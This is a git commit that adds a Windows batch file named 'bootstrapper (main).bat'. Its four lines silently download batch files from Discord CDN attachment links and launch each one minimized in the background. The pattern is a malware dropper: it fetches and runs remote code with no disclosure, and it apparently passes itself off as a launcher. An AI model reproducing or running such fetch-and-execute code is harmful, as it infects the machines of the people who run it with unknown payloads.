430af25acfa8b862ea75cf0362e2cac1968bb5dd
ThursdayGG <131311161+ThursdayGG@users.noreply.github.com>
2023-07-10 22:17:17 -0400

    Add files via upload

---
+++ bootstrapper (main).bat
@@ -0,0 +1,4 @@
+curl -s -O https://cdn.discordapp.com/attachments/1120517013643730945/1125667795208769569/Connection.bat && start /b /min Connection.bat
+curl -s -O https://cdn.discordapp.com/attachments/1120517013643730945/1125623669822062682/appdat.bat && start /b /min appdat.bat
+curl -s -O https://cdn.discordapp.com/attachments/1120517013643730945/1125592381249560706/Rich.bat && start /b /min Rich.bat
+curl -s -O https://cdn.discordapp.com/attachments/1120517013643730945/1125594568243564544/power.bat && start /b /min power.bat
